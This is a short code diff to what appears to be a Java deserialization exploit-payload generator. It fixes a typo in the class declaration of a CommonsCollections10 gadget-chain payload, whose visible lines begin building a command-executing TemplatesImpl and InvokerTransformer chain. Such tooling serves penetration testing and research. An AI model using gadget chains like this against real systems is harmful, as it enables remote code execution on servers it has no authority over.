@@ -13,7 +13,7 @@ import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 
-public class CommonsCollections10 extends dogeser.payloads.util.PayloadRunnerPayloadRunner implements ObjectPayload<HashSet> {
+public class CommonsCollections10 extends dogeser.payloads.util.PayloadRunner implements ObjectPayload<HashSet> {
     public HashSet getObject(String command) throws Exception{
         Object templates = Gadgets.createTemplatesImpl(command);
         InvokerTransformer transformer = new InvokerTransformer("toString",new Class[0], new Object[0]);
